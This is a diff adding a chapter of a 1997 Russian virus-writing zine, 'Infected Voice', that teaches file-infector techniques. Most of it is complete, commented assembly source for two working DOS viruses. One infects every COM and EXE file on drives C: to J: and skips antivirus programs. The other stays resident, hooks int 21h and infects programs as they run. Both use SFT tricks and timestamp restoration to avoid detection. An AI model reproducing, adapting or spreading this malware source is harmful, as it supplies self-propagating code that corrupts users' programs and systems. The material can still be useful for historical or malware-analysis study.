@@ -1,0 +1,969 @@
+
+      ▄▄                  █
+     ▀▀▀  Virus Magazine  █ Box 176, Kiev 210, Ukraine      IV  1997
+     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
+      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █  █ █
+       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ █  █ █
+       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █  █ █
+       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
+          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
+
+                        3.  Типы файловых вирусов.
+
+3.1 Hерезидентные файловые вирусы.
+Вирусы такого типа ,при запуске зараженного файла отрабатывают свой код и
+отдают управление оригинальному файлу.Действия вируса не изменяют состояние
+памяти системы и не оставляют в памяти следов своего присутствия.
+Обычно при старте вируса ,он подготавливает память для запуска оригинального
+файла,заражает на диске что-либо,и передает управление оригинальной программе.
+При поиске файлов для заражения используются ф-ции двадцать первого 
+прерывания FindFirst/FindNext.
+Вместо голословия,я превожу пример нерезидентного вируса заражающего файлы
+на логических дисках винчестера.
+
+;--- CE-xxxx (Zipper).------------------------------------------------------
+; Данный вирус написан мною под влиянием развития современной вычислительной
+; техники и деградации программных средств.
+; Идея его в том,что он циклически обходит логические диски винчестера (от 
+; 'C:' до 'J:') и заражает файлы во всех подкаталогах.Это напоминает 
+; "aidstest * /f" да только ключ /f исполняет совсем несвойственную ему 
+; функцию ...
+; Хоть и не выводим мы на экран цветастых картинок , но при единственном 
+; запуске заражаем ВЕСЬ винчестер!!!
+; Исходный текст построен по группам исполнения!
+; Здесь имеется отдельная процедуры инициализации , обхода дисков и 
+; каталогов, а так же автономная процедура заражения.
+
+LenSec          equ     2
+LenTail         equ     0189
+
+                .model  tiny
+                .code
+
+                org     100h
+Virr:
+                call    $+3
+                pop     si
+                sub     si,03
+;------------------------------
+                lea     bx,[si+offset RunProgram-100h]
+                push    ds si cs bx
+;Stack -> PSPseg | offset Virr | cseg | offset RunProgram
+;------------------------------
+                mov     ax,cs
+                add     ax,1000h
+                mov     es,ax
+                mov     bx,offset MainPart
+                push    ax bx   ; for RETF
+                push    cs
+                pop     ds
+                mov     di,100h
+                mov     cx,offset VirusLen - 100h
+                cld
+                rep     movsb
+                retf            ; Go to MainPart in new segment!
+;- COM or EXE ?---------------------------------------------------
+RunProgram:
+                pop     bx ds
+                push    ds
+                pop     es
+;--Возвратим старое DTA --------
+                mov     dx,80h
+                mov     ah,1ah
+                int     21h
+;-------------------------------
+                cmp     word ptr cs:[bx+offset OriginBytes-100h],'ZM'
+                jz      L_exe
+;-Вocстановить три байта З.П.-------------------------------------
+                mov     di,100h
+                lea     si,[bx+offset OriginBytes-100h]
+                push    di
+                movsw
+                movsw
+                movsb
+                ret             ; Go to infected com program.
+;-Loaded from exe file.--------------------------------------------
+L_exe:
+                mov     ax,es
+                add     ax,10h
+                push    ax
+                add     cs:[offset CS_file-offset virr][bx],ax
+                pop     ax
+SS_file:        add     ax,0000
+                cli
+                mov     ss,ax
+SP_file:        mov     sp,0000
+                sti
+                db      0eah
+IP_file         dw      ?
+CS_file         dw      ?
+;---------------------------------------------------------
+;/////////////////////////////////////////////////////////
+;---------------------------------------------------------
+MainPart        proc
+                push    cs cs
+                pop     es ds
+                mov     byte ptr Drive,'C'      ; For first disk!
+                call    MakeDrive
+                mov     ah,19h          ; Сохраним имя текущего диска!
+                int     21h
+                mov     byte ptr [offset OldDisk+1],al
+                mov     si,offset OldROOT
+                add     al,'A'
+                mov     byte ptr [si-3],al
+                mov     word ptr [si-2],'\:'
+;-----------------------------------------------
+                mov     ah,47h
+                mov     dl,0
+                int     21h
+                cmp     byte ptr [si],0
+                jnz     _OkROOT
+                mov     word ptr [si],002eh     ; '.',0
+;-----------------------------------------------
+_OkROOT:
+                mov     OfsDir,offset DirSearchMask+2
+                mov     OfsFile,offset FileSearchMask
+                mov     fl,0
+;-----------------------------------------------
+; * Ставим текущим диск ,который будем сканировать!
+                mov     ah,0eh
+                mov     dl,byte ptr Drive
+                sub     dl,'A'
+                int     21h
+                jc      NoLogicalDisk
+                call    DiskTest        ; Cure disk!
+;-----------------------------------------------
+;Инкрементируем номер диска для следующих заражений.
+;(У меня на Поцике с виртуальным диском C: при установке
+; несуществующего диска флаг CY не подымается,а посему я заражаю диски
+; от 'C:' до 'J:' )
+                inc     byte ptr Drive
+                cmp     byte ptr Drive,'J'
+                ja      NoLogicalDisk
+                call    MakeDrive
+                jmp     _OkROOT
+;-----------------------------------------------
+NoLogicalDisk:
+                mov     ah,0eh          ; Возвратим текущий диск!
+OldDisk:        mov     dl,00
+                int     21h
+;-----------------------------------------------
+                mov     ah,3bh
+                mov     dx,offset OldROOT-3
+                int     21h
+                retf            ; Go to RunProgram in old segment!
+MainPart        endp
+;-----------------------------------------------
+MakeDrive       proc
+                mov     byte ptr Drive+1,':'
+                mov     word ptr Drive+2,005ch  ; 'C:\',0
+                ret
+MakeDrive       endp
+;---------------------------------------------------------
+;/////////////////////////////////////////////////////////
+;-Scan and Infect disk!-----------------------------------
+DiskTest        proc
+;---------------------------------------------------------
+; * Входим в корневик!
+                mov     ah,3bh
+                mov     dx,offset Drive
+                int     21h
+;---------------------------------------------------------
+                mov     si,offset Drive+2
+                call    MakeTitle               ; SI=offset Dir -->
+                                                ; Dir = Dir'*.*'
+                call    AllDir
+                ret
+DiskTest        endp
+;-------------------------------------------------
+AllDir          proc
+start_1:
+                mov     CntDir,1
+start:
+                mov     si,OfsDir
+                mov     ah,1ah
+                mov     dx,offset DirDTA
+                int     21h
+                call    MakeTitle
+                cmp     fl,0
+                jnz     __11
+
+                call    FindFiles
+                mov     ah,1ah
+                mov     dx,offset DirDTA
+                int     21h
+
+                call    FindFirstDir
+                jc      ExitDir
+                jmp     __22
+__11:
+                call    FindNextDir
+                jc      ExitDir
+__22:
+                inc     CntDir
+                call    CopyDTAToBuf
+                call    CopyDirName
+                mov     ah,3bh
+                mov     dx,offset DirSearchMask
+                int     21h
+                mov     fl,0
+;----No look CY!
+                jmp     start
+ExitDir:
+                cmp     CntDir,0
+                jz      ExitProc
+                dec     CntDir
+                mov     ah,3bh
+                mov     dx,offset EscapeDir
+                int     21h
+                jc      ExitProc
+                call    CopyDTABufToDTA
+                mov     fl,1
+                std
+                mov     si,OfsDir
+                dec     si
+__@@:
+                lodsb
+                dec     OfsDir
+                dec     OfsFile
+                cmp     al,'\'
+                jnz     __@@
+                cmp     CntDir,1
+                ja      start
+                cmp     CntDir,0
+                jz      ExitProc
+                jmp     start_1
+ExitProc:
+                ret
+AllDir          endp
+
+FindFirstDir    proc
+                mov     ah,4eh
+                mov     dx,offset DirSearchMask
+                mov     cx,10h
+                int     21h
+                jc      NoFirstDir
+                test    byte ptr DirDTA+21,10h
+                jz      NoDir
+                cmp     byte ptr DirDTA+30,'.'
+                jz      NoDir
+                clc
+                ret
+NoFirstDir:
+                stc
+                ret
+NoDir:
+                call    FindNextDir
+                ret
+FindFirstDir    endp
+
+FindNextDir     proc
+                mov     ah,4fh
+                int     21h
+                jc      NoFirstDir
+                test    byte ptr DirDTA+21,10h
+                jz      FindNextDir
+                cmp     byte ptr DirDTA+30,'.'
+                jz      FindNextDir
+                clc
+                ret
+FindNextDir     endp
+
+CopyDirName     proc
+                cld
+                mov     di,OfsDir
+                mov     al,'\'
+                stosb
+                mov     si,offset DirDTA+30
+__CopyDir:
+                lodsb
+                cmp     al,0
+                jz      ExitCopyDir_1
+                stosb
+                inc     OfsDir
+                jmp     __CopyDir
+ExitCopyDir_1:
+                xor     ax,ax
+                stosw
+                inc     OfsDir
+                mov     di,offset FileSearchMask
+                mov     si,offset DirSearchMask
+__$$:
+                lodsb
+                cmp     al,0
+                jz      __CopyDir2
+                inc     OfsFile
+                stosb
+                jmp     __$$
+__CopyDir2:
+                xchg    al,ah
+                mov     al,'\'
+                stosw
+
+                mov     di,offset EscapeDir
+                mov     si,offset DirSearchMask
+__$$2:
+                lodsb
+                cmp     al,0
+                jz      __CopyDir3
+                stosb
+                jmp     __$$2
+__CopyDir3:
+                mov     al,'\'
+                stosb
+                mov     ax,'..'
+                stosw
+                xor     ax,ax
+                stosw
+                ret
+CopyDirName     endp
+;----------------------------------
+CopyDTAToBuf    proc
+                push    si di cx ax
+                cld
+                mov     si,offset DirDTA
+                mov     ax,CntDir
+                mov     cx,100
+                mul     cx
+                mov     di,offset DTABuf
+                add     di,ax
+                rep     movsb
+                pop     ax cx di si
+                ret
+CopyDTAToBuf    endp
+;----------------------------------
+CopyDTABufToDTA proc
+                push    si di cx ax
+                cld
+                mov     si,offset DTABuf
+                mov     di,offset DirDTA
+                mov     ax,CntDir
+                inc     ax
+                mov     cx,100
+                mul     cx
+                add     si,ax
+                rep     movsb
+                pop     ax cx di si
+                ret
+CopyDTABufToDTA endp
+;----------------------------------
+MakeTitle       proc
+                mov     word ptr [si],'*\'      ;\*
+                mov     word ptr [si+2],'*.'    ;.*
+                mov     byte ptr [si+4],0       ; ->> Drive\path:'\*.*',0
+                ret
+MakeTitle       endp
+;---------------------------------------------------------
+FindFiles       proc
+                mov     ah,1ah                  ; Set DTA for file search!
+                mov     dx,offset DTABuffer
+                int     21h
+;---------------------------------------------------------
+                mov     ah,4eh                  ; -Findfirst(Dir,
+                mov     cx,3fh                  ;  Anyfile,DTABuffer);
+                mov     dx,offset Drive         ; -
+                int     21h                     ; -
+                jc      ExitDirs
+;---------------------------------------------------------
+NameOperation:
+                cld
+                lea     si,DTABuffer+30         ;.FileName
+                mov     di,offset TestFileName
+CopyFileName:
+                lodsb
+                stosb
+                cmp     al,0
+                jnz     CopyFileName
+;---------------------------------------------------------
+                call    ScanFile        ; Смотрим найденный файл!
+;---------------------------------------------------------
+                mov     ah,4fh                  ; -Findnext(Drive);
+                int     21h
+                jnc     NameOperation
+ExitDirs:
+                ret
+FindFiles       endp
+;---------------------------------------------------------
+;/////////////////////////////////////////////////////////
+;---------------------------------------------------------
+ScanFile        proc
+                push    es bx cx dx si di bp
+                test    byte ptr DTABuffer+21,10h       ; DIR
+                jnz     ExitTestFile
+                test    byte ptr DTABuffer+21,8h        ; LABEL
+                jnz     ExitTestFile
+                test    byte ptr DTABuffer+21,4h        ; SYSTEM
+                jnz     ExitTestFile
+
+                mov     si,offset TestFileName
+                push    si
+                call    SeeExt
+                pop     bp
+                jc      ExitTestFile
+;------------------------------
+                call    SeeFile     ; Собственно открываем файл и т.д. ...
+ExitTestFile:
+                pop     bp di si dx cx bx es
+                ret
+ScanFile        endp
+;---------------------------------------------------------
+SeeExt          proc
+                lodsw
+                dec     si
+                dec     si
+;- Их мы не заражаем! ------------
+                cmp     ax,'RD' ; 'DRweb.exe'
+                jz      BadExt
+                cmp     ax,'IA' ; 'AIdstest.exe'
+                jz      BadExt
+                cmp     ax,'OC' ; 'COmmand.com'
+                jz      BadExt
+;---------------------------------
+                lodsb
+                cmp     al,'.'
+                jnz     SeeExt
+                lodsw
+                cmp     ax,'OC'         ; COM
+                jz      COMOk
+                cmp     ax,'XE'         ; EXE
+                jnz     BadExt
+                cmp     byte ptr [si],'E'
+                jz      ExtOk
+BadExt:
+                stc
+                ret
+COMOk:
+                cmp     byte ptr [si],'M'
+                jnz     BadExt
+ExtOk:
+                clc
+                ret
+SeeExt          endp
+;---------------------------------------------------------
+;/////////////////////////////////////////////////////////
+;---------------------------------------------------------
+;Автономная подпрограмма заражения .COM .EXE файлов.
+;Т.е. отрезаем и вставляем в новый вирус!
+; BP = OFFSET TEST_FILE_NAME !!!!!!!!!!
+SeeFile         proc
+                mov     dx,bp
+                mov     ax,3d00h
+                int     21h
+                jnc     ReadHeader
+                ret
+ReadHeader:
+                mov     bh,3fh
+                xchg    ax,bx
+                mov     cx,18h
+                mov     dx,offset OriginBytes
+                mov     si,dx
+                int     21h
+                jc      _1
+                cmp     word ptr ds:[offset OriginBytes],'ZM'
+                jz      _EXE
+                cmp     word ptr ds:[offset OriginBytes+3],'$$'
+                jz      _1
+;-Infect .COM --------------------------------
+                call    diskryptor
+                cmp     bp,64000
+                ja      _1                   ;Длина больше допустимой.
+                mov     es:[di+21],bp        ;F.p. = end file.
+;-Make JMP------------------------------------
+                sub     bp,03
+                mov     ds:[offset jmp_n],bp
+                call    WriteBody
+                jc      _1b
+                mov     cx,05h
+                mov     dx,offset new_3_byte
+ExitWrite:
+                mov     ah,40h
+                int     21h
+_1b:            jmp     exit_date
+_1:             jmp     exit_close
+;-Infect .EXE ---------------------------------
+_EXE:
+                call    diskryptor
+                cmp     ds:[si+12h],'xx'        ; Already infected ?
+                jz      _1                      ; Yes!
+                mov     ax,ds:[si+4]            ; Pages (512b).
+                dec     ax
+                mov     cx,512
+                mul     cx
+                add     ax,[si+2]       ; DX:AX = File len from header.
+                cmp     ax,bp           ; Real file len = dx:ax ?
+                jnz     _1              ; No - this is overlay.
+                cmp     es:[di+19],dx   ; ********************
+                jnz     _1              ; No - this is overlay.
+;-----
+                mov     es:[di+21],ax   ; F.p.= end file.
+                mov     es:[di+23],dx
+;-Get header.-----------------------------------
+                mov     [si+12h],'xx'
+                mov     ax,[si+14h]
+                mov     ds:[offset IP_file],ax
+                mov     ax,[si+16h]
+                mov     ds:[offset CS_file],ax
+                mov     ax,[si+10h]
+                mov     word ptr ds:[offset SP_file+1],ax
+                mov     ax,[si+0eh]
+                mov     word ptr ds:[offset SS_file+1],ax
+;-----------------------------------------------
+                xchg    ax,bp
+                mov     cx,10h
+                div     cx
+                sub     ax,[si+8]
+                sbb     dx,0
+                mov     [si+16h],ax     ; ReloCS.
+                mov     [si+0eh],ax     ; ReloSS
+                mov     [si+14h],dx     ; ExeIP.
+                mov     [si+10h],offset DTABuf  ; ExeSP
+;-Correcting file len in header.----------------
+                add     word ptr [si+2],LenTail
+                add     word ptr [si+4],LenSec
+;-Write virus in file.--------------------------
+                call    WriteBody
+                jc      exit_date
+;-Write new header.-----------------------------
+                mov     cx,18h
+                mov     ah,40h
+                mov     dx,offset OriginBytes
+                int     21h
+exit_date:
+                mov     ax,5701h
+                mov     cx,es:[di+13]
+                mov     dx,es:[di+15]
+                int     21h
+exit_close:
+                mov     ah,3eh
+                int     21h
+                ret
+SeeFile         endp
+;----------------------------------------------
+WriteBody       proc
+                mov     dx,100h
+                mov     cx,offset VirusLen-100h
+                mov     ah,40h
+                int     21h
+                xor     dx,dx
+                mov     es:[di+21],dx           ; F.p.= start file.
+                mov     es:[di+23],dx           ;
+                ret
+WriteBody       endp
+;----------------------------------------------
+diskryptor      proc
+                mov     ax,1220h
+                push    bx
+                int     2fh
+                mov     bl,es:[di]
+                mov     ax,1216h
+                int     2fh
+                pop     bx
+                mov     byte ptr es:[di+2],02   ; mode = r/w.
+                xor     dx,dx
+                mov     bp,es:[di+17]
+exit_d:         ret
+diskryptor      endp
+;-----------------------------------------------
+db '(c) Light General.Kiev.1995.For free use!'
+;-----------------------------------------------
+new_3_byte      db      0e9h
+jmp_n           dw      0000
+                db      '$$'
+;-----------------------------
+OriginBytes     Label   Byte
+                mov     ax,4c00h
+                int     21h
+                db      13h dup (90h)
+VirusLen        db      ?
+;---------------------------------------------------------
+;/////////////////////////////////////////////////////////
+;---------------------------------------------------------
+OfsDir          dw      ?
+OfsFile         dw      ?
+CntDir          dw      ?
+fl              db      ?
+
+DTABuffer       Label   Byte
+                db      60 dup (?)
+
+RootDir         db      25 dup (?)
+;-----------------------------------------------
+TestFileName    db      25 dup (?)
+;-----------------------------------------------
+Header          db      20h dup (?)
+;-----------------------------------------------
+DirDTA          db      100 dup (?)
+
+DirSearchMask:
+Drive           db      68 dup (?)
+
+FileSearchMask  db      64 dup (?)
+EscapeDir       db      64 dup (?)
+
+                db      3 dup (?)
+OldROOT         db      64 dup (?)
+;----------------------------------------------
+DTABuf          label   byte
+;-----------------------------------------------
+                end     Virr
+
+3.2 Резидентные файловые вирусы.
+Такие вирусы вместо того,чтобы сразу заражать файлы на диске устанавливают
+свое тело резидентно в память и ждут обращения к какому-либо файлу.При
+отслеживании такого обращения файл заражается.
+Пример :
+
+cseg            segment
+                assume  cs:cseg,ds:cseg
+                org     100h
+start:
+                nop             ; Признак заражения .COM файла.
+                jmp     virr
+; Якобы зараженная программа.(Занимает 30 байт).
+                nop
+                nop
+                mov     ah,09
+                lea     dx,wrn
+                int     21h
+                mov     ax,4c00h
+                int     21h
+;--------------------------------------
+wrn             db      'FRODO LIVES!$'
+;--------------------------------------
+
+;################# VIRUS ##################
+
+virr:
+                call    $+3
+                pop     si
+                sub     si,03
+;-Hacked mem.-----------------------------------------------------
+                push    si
+                clc
+                mov     ax,0FEFEh    ; Проверяем память на зараженность!
+                int     21h          ; Коли вирус УЖЕ сидит в машине то он
+                jc      exit_v       ; поднимет флаг CF!
+;- Следующая часть кода производит "откусывание" 512 байт памяти!----------
+; Принцип этого "откусывания" основывается на том,что при выполнении
+; программы ;система строит перед ее кодом такие блоки (обратите внимание
+; на выделенные части)
+;---(1)--- MCB - Memory Control Block (Блок управления памятью)
+; Обычно в таких блоках DOS описывает выделенные программам участки памяти!
+;  ФОРМАТ :
+;─────────────────────┬───────┬───────────────────────────────────
+; Смещение ячейки от  │ Длина │ Назначение
+; начала блока.       │       │
+;                     │       │
+;       00            │  1b   │ Если стоит 'M' то этот блок не последний
+;                     │       │            'Z' последний.
+;       01            │  1w   │ Сегментный адрес (с которого выделен блок).
+;++++>  03            │  1w   │ Длина блока в параграфах (параграф=16 байт)
+;─────────────────────┴───────┴───────────────────────────────────
+;Дальше идут еще данные,но нас интересует только это! ────────────
+;
+;---(2)--- PSP - Program Segment Prefix (Префикс программного сегмента)
+; Сдесь содержится информация для запускаемой программы!
+;  ФОРМАТ :
+;─────────────────────┬───────┬───────────────────────────────────
+; Смещение ячейки от  │ Длина │ Назначение
+; начала блока.       │       │
+;                     │       │
+;       00            │  1w   │ В этом слове стоит команда int 20h (CD 20h)
+;++++>  02            │  1w   │ Общий размер памяти выделенный программе!
+;                     │       │ (При запуске программы DOS выделяет ей всю
+;                     │       │ память "до конца" 640 килобайт!)
+;─────────────────────┴───────┴───────────────────────────────────
+;Дальше идут не интересующие нас данные! ─────────────────────────
+
+;-- Так вот,отнимая некоторое значение от выделенных ячеек,мы можем сделать
+;"дырку" в старших адресах памяти и перенести туда тело вируса!
+;  Практическая реализация :
+                mov     ax,ds
+                dec     ax
+                mov     es,ax
+                sub     word ptr es:[03],35             ;* 512b
+                sub     word ptr ds:[02],35             ;* 512b
+                mov     es,ds:[02]    ; ES = сегментн. адр. "откуш." памяти!
+                push    ds cs
+                pop     ds
+                xor     di,di
+                mov     cx,offset ax_len-offset virr    ; Длина вируса!
+                rep     movsb           ; Переносим вирус в "отк." память!
+;-Install int.----------------------------------------------------
+                mov     al,21h
+                mov     dx,offset int_21h_entry-offset virr
+                mov     si,offset ofs_21h-offset virr
+                push    es
+                pop     ds
+                call    inst_int        ; Установим адрес int 21h на свой
+                                        ; обработчик.
+                pop     ds
+exit_v:
+                push    ds
+                pop     es
+                pop     si
+;- COM or EXE ?---------------------------------------------------
+; Проверим из какого файла мы стартовали?
+;  Это делается потому,что передача управления .COM или .EXE программе
+; происходит по разному!
+                cmp byte ptr cs:[si+offset origin_2_byte-offset virr+1],'Z'
+                jz  L_exe
+;-Вocстановить три байта З.П.-------------------------------------
+;  У .COM файла надобно восстановить четыре первых байта которые мы изменили
+; при заражения файла на диске!(Мы записали туда команду перехода на вирус).
+                mov     di,100h
+                add     si,offset origin_2_byte-offset virr
+; SI = адрес буфера с оригинальными байтами .COM файла!
+                push    di
+                movsw
+                movsw
+                xor     ax,ax
+                ret             ; Go to infected com program.
+;-Loaded from exe file.--------------------------------------------
+;  А вот это способ активации .EXE программы!
+; Сдесь происходит все иначе : т.к. при заражении файла мы изменили в нем
+; заголовок который указывает с какого адреса этот файл запускают!
+; (Кто не знает,что такое заголовок .EXE файла пусть обратится к книге 
+; П.Абеля "Язык Ассемблера для IBM PC и программирования" (стр. 362)
+L_exe:
+                mov     ax,es
+                add     ax,10h
+                add     cs:[offset CS_file-offset virr][si],ax
+; Так мы вычислили сегмент в который надо передать управление!
+                db      0eah    ;-
+IP_file         dw      ?       ;- JMP Far CS_file:IP_file
+CS_file         dw      ?       ;-
+;------------------------------------------------------------------
+;  А это собственно часть отвечающая за заражение программ!
+int_21h_entry   proc
+                cmp     ax,0FEFEh    ;-Если собрат спрашивает о наличии
+                jnz     _@1          ;-своей родни то дать дружеский ответ.
+                stc                  ;-
+int_24h_entry:
+                mov     al,03
+                retf    2
+
+_@1:
+                cmp     ax,4b00h      ; Если DOS пытается выполнить программу
+                jnz     exit_all      ; то мы заражаем ее!
+                jmp     infecting     ;
+exit_date:
+                mov     ax,5701h       ; Установка старой даты файла.
+                mov     cx,es:[di+13]  ;<- Time
+                mov     dx,es:[di+15]  ;<- Date
+                int     21h
+exit_close:
+                mov     ah,3eh         ; Перед передачей управления DOS'у -
+                int     21h            ; закроем файл который заражали!
+exit_pop:
+                lds     dx,cs:[offset ofs_24h-offset virr]
+                mov     ax,2524h       ; Установим на место int 24h
+                int     21h
+                pop     bp
+                pop     ds
+                pop     es
+                pop     di
+                pop     si
+                pop     dx
+                pop     cx
+                pop     bx
+                pop     ax
+exit_all:
+                db      0eah
+ofs_21h         dw      0000
+seg_21h         dw      0000
+int_21h_entry   endp
+;-------------------------------------------------------------------
+infecting:
+                push    ax
+                push    bx
+                push    cx
+                push    dx
+                push    si
+                push    di
+                push    es
+                push    ds
+                push    bp
+                push    ds
+                push    dx
+;------------------------------------------------------------------
+; Переставим адрес вектора int 24h на наш обработчик - т.е. на простую
+;  заглушку,которая в случае "заклееной" дискеты не позволит DOS'у кричать :
+; Write protect error ...
+                mov     al,24h
+                mov     si,offset ofs_24h-offset virr
+                mov     dx,offset int_24h_entry-offset virr
+                call    inst_int
+                pop     dx
+                pop     ds
+;-Open file...-----------------------------------------------------
+                mov     ax,3d00h
+                int     21h
+                jc      exit_pop
+;-Read header (EXE) or first 4 byte (COM).-------------------------
+                mov     bh,3fh
+                xchg    ax,bx
+                mov     cx,18h
+                push    cs
+                pop     ds
+                mov     dx,offset origin_2_byte-offset virr
+                mov     si,dx
+                int     21h  ; Считываем в буфер 24 первых байта программы!
+_1:
+                jc      exit_close  ; Если ошибка,то закроем файл и выйдем.
+;-Look SFT file!-----------------------------
+; Собственно говоря, далее идет "изюминка" вируса - из-за нее он имеет такие
+;малые размеры!И так,что же это :
+; Изволите ли видеть я весьма ленив,и не очень люблю возится с такими
+; рутинами как снятие и установка атрибутов,перемещение файлового указателя!
+; А посему раскопал я внутреннюю подробность DOS'а!
+; (Она упоминается в работе К.Г.Финогенова "Самоучитель по системным функциям
+; MS-DOS" (стр. 67) (а так же в электронном справочнике Help PC)
+; (Впервые применено в RC-0-512 (666,Written by Dark Avenger.)
+; Это SFT -- System File Table - (Системная таблица открытых файлов.)
+;Она создается для вновь открываемого файла и содержит информацию
+; используемую непосредственно процедурами записи/считывания DOS'а!!!
+;
+;  ФОРМАТ :
+;─────────────────────┬───────┬───────────────────────────────────
+; Смещение ячейки от  │ Длина │ Назначение
+; начала блока.(Дес.) │       │
+;                     │       │
+;      00             │  1w   │ Кол-во дескрипторов закрепленных за файлом
+;      02             │  1b   │ Режим доступа заданный при его открытии
+;      04             │  1b   │ Атрибуты файла
+;      11             │  1w   │ Номер первого кластера файла
+;      13             │  1w   │ Время последней модификации файла
+;      15             │  1w   │ Дата ...
+;      17             │  2w   │ Длина файла
+;      21             │  2w   │ Указатель в файле
+;      32             │  11b  │ Имя и расширение файла (без '.')
+;─────────────────────┴───────┴───────────────────────────────────
+                mov     ax,1220h        ; Сей участочек кода позволяет
+                push    bx              ; получить адрес SFT в паре ES:DI
+                int     2fh             ;
+                mov     bl,es:[di]      ;
+                mov     ax,1216h        ;
+                int     2fh             ;
+                pop     bx              ;
+                mov     byte ptr es:[di+2],02   ; ВНИМАНИЕ!Этим действием мы
+                                                ;сделали так,что теперь DOS
+                                                ;считает,что файл открыт для
+                                                ;записи/считывания!
+                                                ; Т.е. нам не понадобилось
+                                                ;снимать атрибуты файла!
+                mov     bp,es:[di+17]   ; BP = file len!
+;---------------------------------------------
+; Теперь проверяем байты которые считали в буфер.
+                lodsb
+                dec     si
+                cmp     al,'M'  ; MZ - признак того,что это .EXE файл!
+                jz      _EXE
+                cmp     al,90h  ; NOP - если это .COM файл то проверим его на
+                                ; повторную зараженность!(Смотрите в начало)
+_1d:
+                jz      exit_close
+;-Infect .COM --------------------------------
+; Так заражают .COM файлы!
+                xchg    ax,bp
+                cmp     ax,65000
+                ja      exit_close              ;Длина больше допустимой.
+
+                mov     es:[di+21],ax           ;Ставим файловый указатель в
+                                                ;конец файла!
+;-Make JMP------------------------------------
+; Т.к. при заражении мы вписываем в начало .COM файла переход на тело вируса 
+; то мы должны вычислить смещение этого перехода!
+                sub     ax,04
+                mov     ds:[offset jmp_n-offset virr],ax
+                call    write_virus     ; Пишем вирус в конец файла!
+                mov     cx,04h  ; А теперь пишем в начало файла тот самый
+                mov     dx,offset new_3_byte-offset virr        ; переход!
+exit_write:
+                mov     ah,40h
+                int     21h
+_1b:            jmp     exit_date
+;-Sub. for write virus body (only) in file.----
+write_virus     proc
+                xor     dx,dx
+                mov     ah,40h
+                mov     cx,offset ax_len-offset virr
+                int     21h
+                mov     es:[di+21],dx   ; F.P = start file!
+                mov     es:[di+23],dx
+                cmp     ax,cx
+                jnz     _1c
+                ret
+_1c:
+                pop     ax
+                jmp     _1b     ; exit_date!
+write_virus     endp
+;-Infect .EXE ---------------------------------
+_EXE:
+; А теперь высчитаем длину файла, исходя из данных записанных в заголовке
+; .EXE файла! И если она не сойдется с записаной в SFT, то мы считаем,что
+; это файл, содержащий неявный оверлей и не заражаем его!
+                mov     ax,ds:[si+4]            ; Pages (512b).
+                dec     ax
+                mov     cx,512
+                mul     cx
+                add     ax,[si+2]       ; AX = File len from header.
+                cmp     ax,bp           ; Real file len = ax ?
+                jnz     _1b             ; No - this is overlay.
+;-----
+                mov     es:[di+21],ax   ; Указатель в конец файла.
+                mov     es:[di+23],dx
+;-Get header.-----------------------------------
+; Запоминаем адрес с которого мы будем запускать .EXE программу!
+                mov     ax,[si+14h]
+                mov     ds:[offset IP_file-offset virr],ax
+                mov     ax,[si+16h]
+                mov     ds:[offset CS_file-offset virr],ax
+;-----------------------------------------------
+; Вычислим новый адрес (т.е. для запуска вируса при старте программы)
+                xchg    ax,bp
+                mov     cx,10h
+                div     cx
+                sub     ax,[si+8]
+                sbb     dx,0
+                mov     [si+16h],ax     ; ReloCS.
+                mov     [si+14h],dx     ; ExeIP.
+;-Correcting file len in header.----------------
+;Теперь откорректируем длину в заголовке .EXE файла!
+;(ПРЕДУПРЕЖДАЮ!Длина вируса = 385 ,а мы увеличиваем длину файла в заголовке
+; не на 385 ,а на 512!!!Т.е. теперь другие "умные вирусы" не будут заражать
+; этот файл).Собственно говоря эта особенность является признаком заражения,-
+; мы ведь не заражаем оверлеи!
+                inc     word ptr ds:[si+4]
+;-Write virus to file.--------------------------
+                call    write_virus
+;-Write new header.-----------------------------
+                mov     cx,18h
+                mov     dx,si   ; DX = offset header.
+                jmp     exit_write   ; Подготовив все к записи исправленного
+                                     ;заголовка мы передаем управление прямо
+                                     ;на команду int 21h!
+;----------------------------------------------
+inst_int        proc
+                mov     ah,35h
+                int     21h
+                mov     ds:[si],bx
+                mov     ds:[si+2],es
+                mov     ah,25h
+                int     21h
+                ret
+inst_int        endp
+new_3_byte      db      90h     ; NOP
+                db      0e9h    ; JMP nn
+jmp_n           dw      0000    ; nn
+;-Header for EXE file & buffer for first 5 bytes COM's file.--
+origin_2_byte:
+header:
+                db      4 dup (90h)     ; NOPs
+ax_len          db      ?
+                db      20h dup (?)     ; For EXE header.
+ofs_24h         dw      ?
+seg_24h         dw      ?
+;********************************************************
+cseg            ends
+                end     start
